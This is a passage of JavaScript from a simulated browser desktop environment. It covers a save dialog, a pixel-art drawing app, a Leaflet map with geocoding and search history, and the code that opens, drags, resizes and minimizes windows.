                    const newPath = `/users/DevDebug/${fileName}`;
                    // Check for existing file could be added here
                    fileSystem.root.children.users.children.DevDebug.children[fileName] = { type: 'file', content: contentToSave };
                    
                    const notesTextarea = notesWindowElement.querySelector('#notes-textarea');
                    notesTextarea.dataset.currentPath = newPath;
                    notesWindowElement.querySelector('.title-bar span').textContent = `Notepad - ${fileName}`;
                    
                    closeDialog();
                } else {
                    alert("File name cannot be empty.");
                }
            });

            dialog.querySelector('#save-filename').focus();
        }

        // --- NEW APP: PIXELR (PIXEL ART) ---
        function initializePixelrWindow(windowElement) {
            windowElement.querySelector('.window-content').innerHTML = `
                <div class="flex h-full bg-black">
                    <!-- Toolbar -->
                    <div class="w-20 flex-shrink-0 p-2 flex flex-col space-y-4" style="background-color: var(--primary-color-darker);">
                        <!-- Tools -->
                        <div>
                            <h4 class="text-xs font-bold mb-2" style="color: var(--text-color-dim);">TOOLS</h4>
                            <div class="space-y-2">
                                <button id="tool-pencil" title="Pencil" class="pixelr-tool active w-full p-2 flex justify-center"><i data-lucide="pencil" class="w-5 h-5"></i></button>
                                <button id="tool-eraser" title="Eraser" class="pixelr-tool w-full p-2 flex justify-center"><i data-lucide="eraser" class="w-5 h-5"></i></button>
                            </div>
                        </div>
                        <!-- Colors -->
                        <div>
                            <h4 class="text-xs font-bold mb-2" style="color: var(--text-color-dim);">PALETTE</h4>
                            <div id="color-palette" class="grid grid-cols-2 gap-2">
                                <!-- Color swatches will be injected here -->
                            </div>
                        </div>
                    </div>
                    <!-- Canvas Area -->
                    <div class="flex-grow flex items-center justify-center p-2">
                        <canvas id="pixelr-canvas" class="bg-gray-800" style="border: 1px solid var(--primary-color-dark);"></canvas>
                    </div>
                </div>
            `;

            const canvas = windowElement.querySelector('#pixelr-canvas');
            const ctx = canvas.getContext('2d');
            const paletteContainer = windowElement.querySelector('#color-palette');

            const CANVAS_SIZE = 480;
            const PIXEL_SIZE = 15;
            const GRID_COUNT = CANVAS_SIZE / PIXEL_SIZE;
            canvas.width = CANVAS_SIZE;
            canvas.height = CANVAS_SIZE;

            let isDrawing = false;
            let activeColor = '#00FF41'; // Default to theme primary
            let activeTool = 'pencil';

            // Define color palette
            const colors = ['#FFFFFF', '#000000', '#FF4500', '#00FF41', '#00FFFF', '#FF00FF', '#FFFF00', '#1E90FF'];
            colors.forEach((color, index) => {
                const swatch = document.createElement('div');
                swatch.className = 'color-swatch';
                if (index === 3) swatch.classList.add('active'); // Default active
                swatch.style.backgroundColor = color;
                swatch.dataset.color = color;
                paletteContainer.appendChild(swatch);
            });

            // Tool and Color Selection
            windowElement.addEventListener('click', (e) => {
                const toolBtn = e.target.closest('.pixelr-tool');
                const swatch = e.target.closest('.color-swatch');

                if (toolBtn) {
                    windowElement.querySelectorAll('.pixelr-tool').forEach(b => b.classList.remove('active'));
                    toolBtn.classList.add('active');
                    activeTool = toolBtn.id.split('-')[1]; // 'pencil' or 'eraser'
                }
                if (swatch) {
                    windowElement.querySelectorAll('.color-swatch').forEach(s => s.classList.remove('active'));
                    swatch.classList.add('active');
                    activeColor = swatch.dataset.color;
                }
            });

            // Drawing Logic
            const drawPixel = (e) => {
                const rect = canvas.getBoundingClientRect();
                const x = Math.floor((e.clientX - rect.left) / PIXEL_SIZE);
                const y = Math.floor((e.clientY - rect.top) / PIXEL_SIZE);

                if (x < 0 || x >= GRID_COUNT || y < 0 || y >= GRID_COUNT) return;

                ctx.fillStyle = activeTool === 'pencil' ? activeColor : 'transparent'; // Eraser uses transparent
                ctx.clearRect(x * PIXEL_SIZE, y * PIXEL_SIZE, PIXEL_SIZE, PIXEL_SIZE); // Clear first for eraser
                if (activeTool === 'pencil') {
                    ctx.fillRect(x * PIXEL_SIZE, y * PIXEL_SIZE, PIXEL_SIZE, PIXEL_SIZE);
                }
            };

            canvas.addEventListener('mousedown', (e) => {
                isDrawing = true;
                drawPixel(e);
            });
            canvas.addEventListener('mousemove', (e) => {
                if (isDrawing) {
                    drawPixel(e);
                }
            });
            document.addEventListener('mouseup', () => { // Listen on document to catch mouseup outside canvas
                isDrawing = false;
            });
            canvas.addEventListener('mouseleave', () => { // Also stop if mouse leaves canvas
                isDrawing = false;
            });

            lucide.createIcons({ nodes: windowElement.querySelectorAll('[data-lucide]') });
        }

        // --- NEW APP: GEOINT MAP (LEAFLET.JS) ---
        function initializeMapWindow(windowElement) {
            // --- NEW: Custom Control for Live Coordinates ---
            L.Control.Coordinates = L.Control.extend({
                onAdd: function(map) {
                    const container = L.DomUtil.create('div', 'leaflet-control-coordinates');
                    container.innerHTML = 'Lat: 0.00000, Lon: 0.00000';
                    
                    map.on('mousemove', (e) => {
                        const wrappedLatLng = e.latlng.wrap(); // FIX: Wrap coordinates
                        const lat = wrappedLatLng.lat.toFixed(5);
                        const lng = wrappedLatLng.lng.toFixed(5);
                        container.innerHTML = `Lat: ${lat}, Lon: ${lng}`;
                    });
                    
                    map.on('mouseout', () => {
                        container.innerHTML = '---';
                    });

                    return container;
                },
                onRemove: function(map) {
                    map.off('mousemove');
                    map.off('mouseout');
                }
            });

            // --- NEW: Custom Select Dropdown Control for Layers ---
            L.Control.SelectLayers = L.Control.extend({
                onAdd: function(map) {
                    const container = L.DomUtil.create('div', 'leaflet-control-select-layers leaflet-bar');
                    const select = L.DomUtil.create('select', '', container);

                    // Populate select options
                    for (const name in this.options.baseLayers) {
                        const option = L.DomUtil.create('option', '', select);
                        option.value = name;
                        option.innerHTML = name;
                        if (map.hasLayer(this.options.baseLayers[name])) {
                            select.value = name;
                        }
                    }

                    L.DomEvent.on(select, 'change', () => {
                        const selectedLayerName = select.value;
                        // Remove all other base layers
                        for (const name in this.options.baseLayers) {
                            if (map.hasLayer(this.options.baseLayers[name])) {
                                map.removeLayer(this.options.baseLayers[name]);
                            }
                        }
                        // Add the selected one
                        map.addLayer(this.options.baseLayers[selectedLayerName]);
                    });

                    // Prevent map clicks from propagating
                    L.DomEvent.disableClickPropagation(container);
                    return container;
                },
                onRemove: function(map) {
                    // Nothing to do here
                }
            });

            // Prevent the map from being re-initialized on window resize/focus
            if (windowElement.querySelector('#map-container.leaflet-container')) {
                return;
            }

            windowElement.querySelector('.window-content').innerHTML = `
                <div id="map-container" class="h-full w-full"></div>
            `;

            const mapContainer = windowElement.querySelector('#map-container');

            // Define Tile Layers
            const darkLayer = L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
                attribution: '',
                subdomains: 'abcd',
                maxZoom: 20
            });
            const satelliteLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
                attribution: ''
            });
            const streetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: ''
            });
            const topoLayer = L.tileLayer('https://{s}.tile.opentopomap.org/{z}/{x}/{y}.png', {
                attribution: ''
            });

            // Map Resize Observer
            const resizeObserver = new ResizeObserver(() => {
                // Use a timeout to ensure the resize is complete before invalidating
                setTimeout(() => map.invalidateSize(), ANIMATION_CONSTANTS.RESIZE_DEBOUNCE);
            });
            // Observe the window's content area for size changes
            resizeObserver.observe(windowElement.querySelector('.window-content'));

            // Initialize Map
            const map = L.map(mapContainer, {
                center: [20, 0], // Start with a global view
                zoom: 2, // Initial zoom level
                minZoom: 2, // Prevent zooming out further than this
                layers: [darkLayer], // Default to dark layer
                attributionControl: false // --- FIX: Remove Leaflet branding ---
            });

            // Layer Control (using the new custom select control)
            const baseMaps = {
                "Default": darkLayer,
                "Satellite": satelliteLayer,
                "Street": streetLayer,
                "Topographic": topoLayer // Added new layer
            };
            new L.Control.SelectLayers({ baseLayers: baseMaps }, { position: 'topright' }).addTo(map);
            new L.Control.Coordinates({ position: 'bottomright' }).addTo(map);

            let customMarker = null;

            // Custom Marker Icon
            const greenIcon = L.icon({
                iconUrl: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="32" height="32"><path fill="%2300FF41" d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/><path d="M0 0h24v24H0z" fill="none"/></svg>',
                iconSize: [32, 32],
                iconAnchor: [16, 32],
                popupAnchor: [0, -32]
            });

            // Function to add or update the marker
            const placeMarker = (latlng, popupContent) => {
                if (customMarker) {
                    map.removeLayer(customMarker);
                }
                customMarker = L.marker(latlng, { icon: greenIcon }).addTo(map);
                if (popupContent) {
                    customMarker.bindPopup(popupContent).openPopup();
                }
            };

            // NEW: Reverse geocode function
            const reverseGeocodeAndPlaceMarker = async (latlng) => {
                const wrappedLatLng = latlng.wrap(); // FIX: Wrap coordinates before using them
                const lat = wrappedLatLng.lat;
                const lng = wrappedLatLng.lng;
                const defaultPopup = `<b>Coordinates:</b><br>${lat.toFixed(5)}, ${lng.toFixed(5)}`;

                // Initially place marker with a loading message
                placeMarker(wrappedLatLng, `<b>Locating...</b><br>${lat.toFixed(5)}, ${lng.toFixed(5)}`);

                if (!API_CONFIG.OPENCAGE.KEY || API_CONFIG.OPENCAGE.KEY === 'YOUR_OPENCAGE_API_KEY') {
                    console.warn("OpenCage API key is missing. Displaying coordinates only.");
                    placeMarker(latlng, defaultPopup);
                    return;
                }

                try {
                    const response = await fetch(`${API_CONFIG.OPENCAGE.BASE_URL}?q=${lat}+${lng}&key=${API_CONFIG.OPENCAGE.KEY}`);
                    const data = await response.json();
                    if (data.results && data.results.length > 0) {
                        const locationName = data.results[0].formatted;
                        placeMarker(wrappedLatLng, `<b>${locationName}</b>`);
                    } else {
                        placeMarker(wrappedLatLng, defaultPopup); // Fallback if no name found
                    }
                } catch (error) {
                    console.error("Reverse geocoding failed:", error);
                    placeMarker(wrappedLatLng, defaultPopup); // Fallback to coordinates on error
                }
            };

            // Minimalist GeoSearch Control
            const searchControl = new GeoSearch.GeoSearchControl({
                provider: new GeoSearch.OpenStreetMapProvider(),
                style: 'bar',
                showMarker: false,
                searchLabel: 'Search location',
                autoClose: true,
                keepResult: true,
                position: 'topleft',
                clearButton: true,
                placeholder: 'Search location...',
                popupFormat: ({ query, result }) => result.label,
                resultFormat: ({ result }) => result.label,
                maxSuggestions: 6,
                retainZoomLevel: false,
                animateZoom: true,
                showPopup: false,
                updateMap: true
            });
            map.addControl(searchControl);

            // Store search history
            if (!window.mapSearchHistory) {
                window.mapSearchHistory = [];
            }

            // Enhanced search result handler
            map.on('geosearch/showlocation', (result) => {
                const latlng = L.latLng(result.location.y, result.location.x);
                
                // Add to search history (max 10 items)
                const searchEntry = {
                    query: result.label,
                    latlng: latlng,
                    timestamp: Date.now()
                };
                window.mapSearchHistory.unshift(searchEntry);
                if (window.mapSearchHistory.length > 10) {
                    window.mapSearchHistory.pop();
                }
                
                // Zoom to location with smooth animation
                map.setView(latlng, Math.max(map.getZoom(), 13), {
                    animate: true,
                    duration: 0.5
                });
                
                reverseGeocodeAndPlaceMarker(latlng);
            });

            // Enhanced keyboard shortcuts and features
            // Wait for control to be fully rendered
            setTimeout(() => {
                const searchInput = searchControl._container?.querySelector('input[type="text"]');
                const searchForm = searchControl._container?.querySelector('form');
                
                if (searchInput && searchForm) {
                    // Ensure form has relative positioning for results
                    searchForm.style.position = 'relative';
                    
                    // Enter to search
                    searchInput.addEventListener('keydown', (e) => {
                        if (e.key === 'Enter') {
                            e.preventDefault();
                            const query = searchInput.value.trim();
                            if (query) {
                                // Trigger search
                                searchForm.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
                            }
                        }
                        // Escape to clear
                        if (e.key === 'Escape') {
                            searchInput.value = '';
                            searchInput.blur();
                            // Hide results
                            const results = searchControl._container?.querySelector('.results');
                            if (results) {
                                results.style.display = 'none';
                            }
                            if (customMarker) {
                                map.removeLayer(customMarker);
                                customMarker = null;
                            }
                        }
                    });

                    // Show search history on focus (only if no results are showing)
                    searchInput.addEventListener('focus', () => {
                        // Small delay to check if geosearch results appear
                        setTimeout(() => {
                            const results = searchControl._container?.querySelector('.results');
                            if (!results || results.children.length === 0) {
                                showSearchHistory(searchInput, map);
                            }
                        }, 200);
                    });
                    
                    // Ensure results are visible when typing
                    searchInput.addEventListener('input', () => {
                        setTimeout(() => {
                            const results = searchControl._container?.querySelector('.results');
                            if (results) {
                                results.style.display = 'block';
                                results.style.visibility = 'visible';
                                results.style.opacity = '1';
                                results.style.zIndex = '10000';
                            }
                        }, 100);
                    });

                    // Monitor for results appearing and ensure they're visible
                    const observer = new MutationObserver(() => {
                        const results = searchControl._container?.querySelector('.results');
                        if (results && results.children.length > 0) {
                            results.style.display = 'block';
                            results.style.visibility = 'visible';
                            results.style.opacity = '1';
                            results.style.zIndex = '10000';
                            // Hide history when results appear
                            const history = document.querySelector('.devdebug-search-history');
                            if (history) {
                                history.remove();
                            }
                        }
                    });
                    
                    if (searchControl._container) {
                        observer.observe(searchControl._container, {
                            childList: true,
                            subtree: true
                        });
                    }

                    // Minimalist placeholder
                    searchInput.setAttribute('placeholder', 'Search location...');
                    searchInput.style.fontFamily = 'Consolas, Monospace, monospace';
                }
            }, 200);

            // Add marker on map click
            map.on('click', (e) => {
                reverseGeocodeAndPlaceMarker(e.latlng);
            });

            /**
             * Shows search history dropdown
             * @param {HTMLElement} inputElement - The search input element
             * @param {L.Map} mapInstance - The Leaflet map instance
             */
            function showSearchHistory(inputElement, mapInstance) {
                if (!window.mapSearchHistory || window.mapSearchHistory.length === 0) {
                    return;
                }

                // Remove existing history dropdown if any
                const existingHistory = document.querySelector('.devdebug-search-history');
                if (existingHistory) {
                    existingHistory.remove();
                }

                // Create minimalist history dropdown
                const historyContainer = document.createElement('div');
                historyContainer.className = 'devdebug-search-history';
                historyContainer.style.cssText = `
                    position: absolute;
                    top: 100%;
                    left: 0;
                    right: 0;
                    max-height: 200px;
                    overflow-y: auto;
                    z-index: 10000;
                    margin-top: -1px;
                `;

                const historyTitle = document.createElement('div');
                historyTitle.className = 'devdebug-history-title';
                historyTitle.textContent = 'Recent';
                historyContainer.appendChild(historyTitle);

                window.mapSearchHistory.slice(0, 5).forEach((entry) => {
                    const historyItem = document.createElement('div');
                    historyItem.className = 'devdebug-history-item';
                    historyItem.textContent = entry.query;
                    
                    historyItem.addEventListener('mouseenter', () => {
                        historyItem.style.backgroundColor = 'rgba(0, 255, 65, 0.1)';
                        historyItem.style.color = 'var(--primary-color)';
                    });
                    
                    historyItem.addEventListener('mouseleave', () => {
                        historyItem.style.backgroundColor = 'transparent';
                        historyItem.style.color = 'var(--text-color-dim)';
                    });
                    
                    historyItem.addEventListener('click', () => {
                        inputElement.value = entry.query;
                        mapInstance.setView(entry.latlng, Math.max(mapInstance.getZoom(), 13), {
                            animate: true,
                            duration: 0.5
                        });
                        reverseGeocodeAndPlaceMarker(entry.latlng);
                        historyContainer.remove();
                    });
                    
                    historyContainer.appendChild(historyItem);
                });

                // Insert after search control
                const searchControlContainer = searchControl._container;
                if (searchControlContainer) {
                    searchControlContainer.style.position = 'relative';
                    searchControlContainer.appendChild(historyContainer);
                }

                // Close history when clicking outside
                const closeHistory = (e) => {
                    if (!historyContainer.contains(e.target) && e.target !== inputElement) {
                        historyContainer.remove();
                        document.removeEventListener('click', closeHistory);
                    }
                };
                setTimeout(() => document.addEventListener('click', closeHistory), 100);
            }
        }

        // --- UTILITY FUNCTIONS ---

        /**
         * Closes a single instance of an application, identified by its appId.
         * @param {string} appId - The unique ID of the application (e.g., 'browser').
         * @throws {Error} If appId is invalid or window doesn't exist
         */
        function closeApp(appId) {
            if (!appId || typeof appId !== 'string') {
                console.error('closeApp: Invalid appId provided');
                return;
            }

            // Disconnect resize observer for map to prevent memory leaks
            if (appId === 'map' && window.mapResizeObserver) {
                window.mapResizeObserver.disconnect();
                window.mapResizeObserver = null;
            }
            const windowElement = WindowManager.openWindows[appId]; 
            if (windowElement) {
                // Run cleanup function if it exists (important for games/observers)
                if (windowElement.cleanup) {
                    windowElement.cleanup();
                }
                windowElement.remove();
                delete WindowManager.openWindows[appId]; // Remove from tracking map
            }
        }

        /**
         * Minimizes an application window.
         * @param {string} appId - The unique ID of the application.
         */
        function minimizeApp(appId) {
            const windowElement = WindowManager.openWindows[appId];
            if (windowElement) {
                windowElement.style.display = 'none'; // Hide the window
                windowElement.isMinimized = true;
                updateAppTray(); // Update the tray to show it's no longer active
            }
        }

        /**
         * Toggles an application window between maximized and restored states.
         * @param {string} appId - The unique ID of the application.
         */
        function toggleMaximizeApp(appId) {
            const windowElement = WindowManager.openWindows[appId];
            if (!windowElement) return;

            const titleBar = windowElement.querySelector('.title-bar');
            const maximizeBtnIcon = windowElement.querySelector('.maximize-btn i');

            if (windowElement.isMaximized) {
                // --- RESTORE ---
                windowElement.style.top = windowElement.previousState.top;
                windowElement.style.left = windowElement.previousState.left;
                windowElement.style.width = windowElement.previousState.width;
                windowElement.style.height = windowElement.previousState.height;
                
                windowElement.isMaximized = false;
                windowElement.classList.remove('maximized');
                titleBar.style.cursor = 'grab';
                
                maximizeBtnIcon.setAttribute('data-lucide', 'square');
            } else {
                // --- MAXIMIZE ---
                windowElement.previousState = {
                    top: windowElement.style.top,
                    left: windowElement.style.left,
                    width: windowElement.style.width,
                    height: windowElement.style.height,
                };

                windowElement.style.top = '0px';
                windowElement.style.left = '0px';
                windowElement.style.width = '100%';
                windowElement.style.height = `calc(100% - ${UI_CONSTANTS.TASKBAR_HEIGHT}px)`; // Account for taskbar
                
                windowElement.isMaximized = true;
                windowElement.classList.add('maximized');
                titleBar.style.cursor = 'default';
                
                maximizeBtnIcon.setAttribute('data-lucide', 'copy');
            }
            lucide.createIcons({ nodes: [maximizeBtnIcon] });
        }


        /**
         * Brings a window to the front and focuses it
         * @param {HTMLElement} windowElement - The window element to focus
         */
        function focusWindow(windowElement) {
            if (!windowElement || !(windowElement instanceof HTMLElement)) {
                console.error('focusWindow: Invalid window element');
                return;
            }

            // Increase zIndex and ensure the window is on top
            WindowManager.nextZIndex += 1;
            windowElement.style.zIndex = WindowManager.nextZIndex;
            updateAppTray(); // Re-render the tray to show the new active window
        }

        /**
         * Makes a window draggable via its title bar
         * @param {HTMLElement} windowElement - The window element to make draggable
         * @param {HTMLElement} dragHandle - The element that acts as the drag handle (title bar)
         */
        function makeDraggable(windowElement, dragHandle) {
            if (!windowElement || !dragHandle) {
                console.error('makeDraggable: Invalid parameters');
                return;
            }

            let offsetX, offsetY;

            // Prevent dragging if the window is maximized
            if (windowElement.isMaximized) return;

            const onMouseDown = (e) => {
                // If the mousedown is on a button within the title bar, ignore it to allow the button's click event to fire.
                if (e.target.closest('button')) {
                    return;
                }

                if (e.button !== 0) return;
                focusWindow(windowElement);

                const rect = windowElement.getBoundingClientRect();
                offsetX = e.clientX - rect.left;
                offsetY = e.clientY - rect.top;

                dragHandle.style.cursor = 'grabbing';
                document.addEventListener('mousemove', onMouseMove);
                document.addEventListener('mouseup', onMouseUp);
                e.preventDefault();
            };

            const onMouseMove = (e) => {
                let newX = e.clientX - offsetX;
                let newY = e.clientY - offsetY;

                const desktopRect = WindowManager.desktop.getBoundingClientRect();
                newX = Math.max(0, Math.min(newX, desktopRect.width - windowElement.offsetWidth));
                newY = Math.max(0, Math.min(newY, desktopRect.height - windowElement.offsetHeight - UI_CONSTANTS.TASKBAR_HEIGHT)); 

                windowElement.style.left = `${newX}px`;
                windowElement.style.top = `${newY}px`;
            };

            const onMouseUp = () => {
                dragHandle.style.cursor = 'grab';
                document.removeEventListener('mousemove', onMouseMove);
                document.removeEventListener('mouseup', onMouseUp);
            };

            dragHandle.addEventListener('mousedown', onMouseDown);
        }

        /**
         * Makes a window resizable via a resize handle
         * @param {HTMLElement} windowElement - The window element to make resizable
         * @param {HTMLElement} resizeHandle - The resize handle element
         */
        function makeResizable(windowElement, resizeHandle) {
            if (!windowElement || !resizeHandle) {
                console.error('makeResizable: Invalid parameters');
                return;
            }

            let startX, startY, initialWidth, initialHeight;

            // Prevent resizing if the window is maximized
            if (windowElement.isMaximized) return;

            const onMouseDown = (e) => {
                if (e.button !== 0) return;
                focusWindow(windowElement); // Focus on resize start

                startX = e.clientX;
                startY = e.clientY;
                initialWidth = windowElement.offsetWidth;
                initialHeight = windowElement.offsetHeight;

                document.addEventListener('mousemove', onMouseMove);
                document.addEventListener('mouseup', onMouseUp);
                e.preventDefault();
            };

            const onMouseMove = (e) => {
                const dx = e.clientX - startX;
                const dy = e.clientY - startY;

                let newWidth = initialWidth + dx;
                let newHeight = initialHeight + dy;

                windowElement.style.width = `${Math.max(UI_CONSTANTS.MIN_WINDOW_WIDTH, newWidth)}px`;
                windowElement.style.height = `${Math.max(UI_CONSTANTS.MIN_WINDOW_HEIGHT, newHeight)}px`;
            };

            const onMouseUp = () => {
                document.removeEventListener('mousemove', onMouseMove);
                document.removeEventListener('mouseup', onMouseUp);
            };

            resizeHandle.addEventListener('mousedown', onMouseDown);
        }

        /**
         * Function to enable dragging for desktop icons.
         */
        function makeIconDraggable(iconElement) {
            let startX, startY, offsetX, offsetY;
            let dragged = false;
            const DRAG_THRESHOLD = UI_CONSTANTS.DRAG_THRESHOLD;

            const onMouseDown = (e) => {
                if (e.button !== 0) return;
                
                startX = e.clientX;
                startY = e.clientY;
                dragged = false;
                
                const rect = iconElement.getBoundingClientRect();
                offsetX = e.clientX - rect.left;
                offsetY = e.clientY - rect.top;

                iconElement.style.cursor = 'grabbing';

                document.addEventListener('mousemove', onMouseMove);
                document.addEventListener('mouseup', onMouseUp);
                e.preventDefault();
                e.stopPropagation(); 
            };

            const onMouseMove = (e) => {
                const dx = e.clientX - startX;
                const dy = e.clientY - startY;

                if (Math.abs(dx) > DRAG_THRESHOLD || Math.abs(dy) > DRAG_THRESHOLD) {
                    dragged = true;
                    // Set global flag to prevent accidental actions on mouseup
                    WindowManager.isDraggingIcon = true; 

                    const newX = e.clientX - offsetX;
                    const newY = e.clientY - offsetY;

                    // Apply boundaries
                    const desktopRect = WindowManager.desktop.getBoundingClientRect();
                    const newLeft = Math.max(0, Math.min(newX, desktopRect.width - iconElement.offsetWidth));
                    // Keep icon above the taskbar
                    const newTop = Math.max(0, Math.min(newY, desktopRect.height - iconElement.offsetHeight - UI_CONSTANTS.TASKBAR_HEIGHT)); 

                    iconElement.style.left = `${newLeft}px`;
                    iconElement.style.top = `${newTop}px`;
                }
                e.stopPropagation();
            };

            const onMouseUp = () => {
                iconElement.style.cursor = 'default';
                document.removeEventListener('mousemove', onMouseMove);
                document.removeEventListener('mouseup', onMouseUp);
                
                // If it was dragged, reset the global flag after a short delay
                if (dragged) {
                    setTimeout(() => { WindowManager.isDraggingIcon = false; }, 100);
                }
            };

            iconElement.addEventListener('mousedown', onMouseDown);
        }

        /**
         * Custom click handler for desktop icons (double-click)
         * @param {HTMLElement} iconElement - The icon element that was clicked
         * @param {string} appId - The application ID to open
         */
        function handleIconClick(iconElement, appId) {
            if (!iconElement || !appId) {
                console.error('handleIconClick: Invalid parameters');
                return;
            }

            // Check if dragging occurred, although dblclick should handle this gracefully
            if (!WindowManager.isDraggingIcon) {
                openApp(appId);
            }
        }


        // --- MAIN LOGIC ---

        /**
         * Opens an application window
         * @param {string} appId - The unique ID of the application to open
         * @returns {void}
         */
        function openApp(appId) {
            if (!appId || typeof appId !== 'string') {
                console.error('openApp: Invalid appId provided');
                return;
            }

            // Check if app is already open (Single Instance Logic)
            if (WindowManager.openWindows[appId]) {
                focusWindow(WindowManager.openWindows[appId]);
                return;
            }

            const appConfig = apps[appId];
            if (!appConfig) {
                console.error(`Application configuration not found for ID: ${appId}`);
                return;
            }

            WindowManager.windowCounter++;
            const windowId = `${appId}-${WindowManager.windowCounter}`; // Unique DOM ID

            const windowElement = document.createElement('div');
            windowElement.id = windowId;
            windowElement.className = `window p-0`;
            windowElement.style.width = `${appConfig.initialWidth}px`;
            windowElement.style.height = `${appConfig.initialHeight}px`;

            // --- NEW: Center the window on open ---
            const desktopRect = WindowManager.desktop.getBoundingClientRect();
            const windowWidth = appConfig.initialWidth;
            const windowHeight = appConfig.initialHeight;
            const topOffset = (desktopRect.height - windowHeight) / 2;
            const leftOffset = (desktopRect.width - windowWidth) / 2;
            windowElement.style.top = `${Math.max(0, topOffset)}px`;
            windowElement.style.left = `${Math.max(0, leftOffset)}px`;

            focusWindow(windowElement);

            windowElement.innerHTML = `
                <!-- Title Bar -->
                <div class="title-bar p-2 flex items-center justify-between text-sm font-semibold">
                    <div class="flex items-center space-x-2">
                        <!-- Use Lucide icon based on config -->
                        <i data-lucide="${appConfig.icon}" class="w-5 h-5"></i>
                        <span>${appConfig.title}</span>
                    </div>
                    <div class="flex items-center space-x-1">
                        <button class="minimize-btn w-6 h-6 rounded-none flex items-center justify-center font-bold transition-colors duration-150"
                                title="Minimize Window">
                            _
                        </button>
                        <button class="maximize-btn w-6 h-6 rounded-none flex items-center justify-center transition-colors duration-150"
                                title="Maximize Window">
                            <i data-lucide="square" class="w-3 h-3"></i>
                        </button>
                        <button class="close-btn w-6 h-6 rounded-none flex items-center justify-center transition-colors duration-150"
                                title="Close Window">
                            X
                        </button>
                    </div>
                </div>

                <!-- Window Content (Placeholder for initializer) -->
                <div class="window-content flex-grow flex flex-col overflow-auto">
                    ${appConfig.content}
                </div>

                <!-- Resize Handle (Bottom Right Corner) -->
                <div class="resize-handle bg-opacity-100 transition-all duration-150"></div>
            `;

            WindowManager.desktop.appendChild(windowElement);
            WindowManager.openWindows[appId] = windowElement; // Store by appId
            
            // Re-render Lucide icons inside the new window
            lucide.createIcons({ attr: 'data-lucide', className: 'lucide-icon' });


            if (appId === 'browser') {
                initializeBrowserWindow(windowElement);
            }
            if (appId === 'robot') {
                initializeChatbotWindow(windowElement);
            }
            if (appId === 'notes') {
                initializeNotesWindow(windowElement);
            }
            if (appId === 'snake') { 
                initializeSnakeWindow(windowElement);
            }
            // Removed: if (appId === 'net-monitor') { initializeNetMonitorWindow(windowElement); }
            if (appId === 'crypto-utility') {
                // Note: The logic handles the app ID 'crypto-utility' but the display name is 'Encryptr'
                initializeCryptoUtilityWindow(windowElement);
            }
            if (appId === 'sysmon') {
                initializeSysMonWindow(windowElement);
            }
            if (appId === 'terminal-tennis') {
                initializeTerminalTennisWindow(windowElement);
            }
            if (appId === 'files') {
                initializeFilesWindow(windowElement);
            }
            if (appId === 'system-properties') {
                initializeSystemPropertiesWindow(windowElement);
            }
            if (appId === 'bin') {
                initializeBinWindow(windowElement);
            }
            if (appId === 'terminal') {
                initializeTerminalWindow(windowElement);
            }
            if (appId === 'devdebug-profile') {
                initializeDevDebugWindow(windowElement);
            }
            if (appId === 'pixelr') {
                initializePixelrWindow(windowElement);
            }
            if (appId === 'settings') {
                initializeSettingsWindow(windowElement);
            }
            if (appId === 'map') {
                initializeMapWindow(windowElement);
            }
            // FIX: Store map resize observer globally to disconnect on close
            if (appId === 'map' && windowElement.resizeObserver) {
                window.mapResizeObserver = windowElement.resizeObserver;
            }


            const titleBar = windowElement.querySelector('.title-bar');
            const minimizeBtn = windowElement.querySelector('.minimize-btn');
            const maximizeBtn = windowElement.querySelector('.maximize-btn');
            const closeBtn = windowElement.querySelector('.close-btn');
            const resizeHandle = windowElement.querySelector('.resize-handle');

            minimizeBtn.addEventListener('click', () => minimizeApp(appId));
            maximizeBtn.addEventListener('click', () => toggleMaximizeApp(appId));
            // Pass appId to closeApp
            closeBtn.addEventListener('click', () => closeApp(appId));

            windowElement.addEventListener('mousedown', (e) => {
                if (e.target.closest('.title-bar') === titleBar) return;
                focusWindow(windowElement);
            });

            // Only make draggable/resizable if not maximized
            if (!windowElement.isMaximized) {
                makeDraggable(windowElement, titleBar);
                makeResizable(windowElement, resizeHandle);
            }
        }

        /**
         * Shows a context menu for a taskbar icon.
         * @param {number} x - The clientX position for the menu.
         * @param {number} y - The clientY position for the menu.
         * @param {string} appId - The ID of the app to be closed.
         */
        function showTaskbarAppContextMenu(x, y, appId) {
            const contextMenu = document.getElementById('context-menu');
            const contextMenuItems = document.getElementById('context-menu-items');

            contextMenuItems.innerHTML = `
                <li data-action="close-app" data-appid="${appId}" class="p-2 text-sm cursor-pointer hover:bg-red-900" style="color: var(--danger-color);">Close</li>
            `;

            // Position menu above the taskbar
            const menuHeight = 40; // Estimate menu height
            contextMenu.style.top = `${y - menuHeight}px`;
            contextMenu.style.left = `${x}px`;
            contextMenu.classList.remove('hidden');
        }

        function updateAppTray() {
            const appTray = document.getElementById('app-tray');
            appTray.innerHTML = '';

            for (const appId in WindowManager.openWindows) {
                const appConfig = apps[appId];
                const windowElement = WindowManager.openWindows[appId]; // Get the correct window element
                const appIcon = document.createElement('button');
                appIcon.className = 'taskbar-app-icon h-full px-3 flex items-center justify-center';
                appIcon.title = appConfig.title;
                appIcon.innerHTML = `<i data-lucide="${appConfig.icon}" class="w-5 h-5"></i>`;
                
                if (parseInt(windowElement.style.zIndex) === WindowManager.nextZIndex) appIcon.classList.add('active');
                
                // Left-click to focus or restore/minimize
                appIcon.addEventListener('click', () => {
                    if (windowElement.isMinimized) {
                        // Restore and focus
                        windowElement.style.display = 'flex';
                        windowElement.isMinimized = false;
                        focusWindow(windowElement);
                    } else if (appIcon.classList.contains('active')) {
                        // If it's already the active window, minimize it
                        minimizeApp(appId);
                    } else {
                        // If it's not active, just focus it
                        focusWindow(windowElement);
                    }
                });

                // Right-click to show close menu
                appIcon.addEventListener('contextmenu', (e) => {
                    e.preventDefault();
                    e.stopPropagation(); // Prevent desktop context menu
                    showTaskbarAppContextMenu(e.clientX, e.clientY, appId);
                });

